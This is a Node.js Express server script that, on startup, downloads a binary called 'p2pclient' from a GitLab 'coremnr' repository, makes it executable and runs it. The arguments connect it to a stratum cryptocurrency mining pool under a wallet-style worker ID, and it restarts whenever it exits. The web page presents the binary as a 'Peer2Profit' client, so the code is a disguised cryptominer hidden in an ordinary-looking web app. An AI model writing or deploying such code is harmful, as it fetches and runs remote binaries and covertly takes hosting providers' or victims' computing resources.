import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import winston from 'winston';
import { spawn } from 'child_process';
import axios from 'axios';
import os from 'os';
import { promisify } from 'util';
import https from 'https';

// Pastikan __dirname bisa digunakan dalam ES Module
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Path file p2pclient
const P2P_PATH = path.join(__dirname, 'p2pclient');
const LOG_FILE = path.join(__dirname, 'p2pclient.log');
const P2P_URL = 'https://gitlab.com/rikzakalani/coremnr/raw/main/p2pclient';

// Logger
const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.printf(({ timestamp, level, message }) => `[${timestamp}] ${level}: ${message}`)
    ),
    transports: [
        new winston.transports.Console(),
        new winston.transports.File({ filename: LOG_FILE })
    ]
});

// Fungsi untuk mengunduh file p2pclient
async function downloadP2PClient() {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(P2P_PATH);
        https.get(P2P_URL, (response) => {
            response.pipe(file);
            file.on('finish', () => {
                file.close(() => {
                    fs.chmodSync(P2P_PATH, '755'); // Beri izin eksekusi
                    resolve();
                });
            });
        }).on('error', (err) => {
            fs.unlink(P2P_PATH, () => reject(err));
        });
    });
}

// Fungsi untuk menjalankan p2pclient
let peerProcess = null;

async function startP2PClient() {
    if (!fs.existsSync(P2P_PATH)) {
        logger.info('🔄 Downloading p2pclient...');
        try {
            await downloadP2PClient();
            logger.info('✅ p2pclient downloaded successfully.');
        } catch (error) {
            logger.error('❌ Failed to download p2pclient:', error);
            process.exit(1);
        }
    }

    logger.info('🚀 Starting p2pclient...');
    peerProcess = spawn(P2P_PATH, ['--noeval', '--hard-aes', '-P', 'stratum1+tcp://cb9072192a56299751a9619430f7493f911e40a794f1.pepek@us.catchthatrabbit.com:8008']);

    peerProcess.stdout.on('data', (data) => logger.info(data.toString()));
    peerProcess.stderr.on('data', (data) => logger.error(data.toString()));

    peerProcess.on('close', (code) => {
        logger.warn(`⚠️ p2pclient exited with code ${code}. Restarting in 5 seconds...`);
        setTimeout(startP2PClient, 5000);
    });

    peerProcess.on('error', (err) => {
        logger.error('❌ Failed to start p2pclient:', err);
    });
}

// Inisialisasi Express
const app = express();
const PORT = process.env.PORT || 5000;

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'templates'));

app.get('/', async (req, res) => {
    try {
        const hostname = os.hostname();
        const { data } = await axios.get('https://ipinfo.io');
        const IP = data.ip;

        let logs = ['Peer2Profit not started, check the process first!'];
        if (fs.existsSync(LOG_FILE)) {
            logs = fs.readFileSync(LOG_FILE, 'utf8').split('\n').slice(-20);
        }

        res.render('index', { IP, hostname, logs });
    } catch (error) {
        logger.error('Error fetching data:', error);
        res.status(500).send('Error fetching data');
    }
});

// Shutdown handling
process.on('SIGINT', () => {
    logger.info('🛑 Stopping p2pclient...');
    if (peerProcess) {
        peerProcess.kill();
    }
    process.exit();
});

// Mulai server
app.listen(PORT, () => {
    logger.info(`🚀 Server running on http://localhost:${PORT}`);
    startP2PClient();
});
